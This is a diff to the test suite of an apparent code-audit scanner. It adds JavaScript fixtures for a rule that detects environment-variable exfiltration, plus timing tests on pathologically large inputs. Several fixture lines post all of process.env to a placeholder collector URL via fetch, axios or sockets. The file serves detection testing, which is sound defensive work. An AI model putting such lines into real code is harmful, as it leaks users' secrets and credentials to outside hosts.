@@ -339,6 +339,13 @@ describe('malicious fixture attack lines', () => {
         'proxy.report(dict(os.environ))',
         'ws.send(json.dumps(os.environ.copy()))',
         'await channel.send(str(dict(os.environ)))',
+        "await fetch(COLLECT_URL, { method: 'POST', body: JSON.stringify({ ...process.env }) });",
+        'await axios.post(COLLECT_URL, Object.entries(process.env));',
+        'await fetch(`${COLLECT_URL}?${new URLSearchParams(process.env)}`);',
+        "request.end(Object.keys(process.env).join(','));",
+        "socket.write(Object.values(process.env).join('\\n'));",
+        'socket.write(util.inspect(process.env));',
+        'const snapshot: Record<string, string | undefined> = { ...process.env };',
       ],
     },
     {
@@ -915,6 +922,48 @@ describe('NET-EXFIL-ENV flow cost on hostile Python', () => {
   it.each(HOSTILE_SHAPES)('should trace $shape within the time budget', async ({ content }) => {
     const filePath = join(tmpDir, 'collect.py');
     await writeFile(filePath, `import os\nimport requests\n${content}`);
+
+    const startedAt = performance.now();
+    const findings = await runRules(filePath, [NET_EXFIL_ENV]);
+    const elapsedMs = performance.now() - startedAt;
+
+    expect(findings.map((finding) => finding.ruleId)).toEqual(['NET-EXFIL-ENV']);
+    expect(elapsedMs).toBeLessThan(FLOW_BUDGET_MS);
+  });
+});
+
+describe('NET-EXFIL-ENV flow cost on hostile JavaScript', () => {
+  // Each shape is quadratic for a flow that checks every declaration of a name at each use, scans
+  // each value to its end, or scans the arguments of every enclosing send.
+  const FLOW_BUDGET_MS = 2_000;
+  const SEND = 'fetch(URL, { body: JSON.stringify({ ...process.env }) })\n';
+  const HOSTILE_SHAPES = [
+    {
+      shape: '20,000 blocks that declare one name, then 20,000 uses',
+      content: `${'{ const x = 1 }\n'.repeat(20_000)}${'f(x)\n'.repeat(20_000)}${SEND}`,
+    },
+    {
+      shape: 'a chain of 100,000 assignments on one line',
+      content: `${'a='.repeat(100_000)}1\n${SEND}`,
+    },
+    {
+      shape: '10,000 nested sends',
+      content: `${'fetch('.repeat(10_000)}{ ...process.env }${')'.repeat(10_000)}\n`,
+    },
+  ];
+  let tmpDir: string;
+
+  beforeEach(async () => {
+    tmpDir = await mkdtemp(join(tmpdir(), 'skill-audit-js-env-flow-'));
+  });
+
+  afterEach(async () => {
+    await rm(tmpDir, { recursive: true, force: true });
+  });
+
+  it.each(HOSTILE_SHAPES)('should trace $shape within the time budget', async ({ content }) => {
+    const filePath = join(tmpDir, 'collect.js');
+    await writeFile(filePath, content);
 
     const startedAt = performance.now();
     const findings = await runRules(filePath, [NET_EXFIL_ENV]);
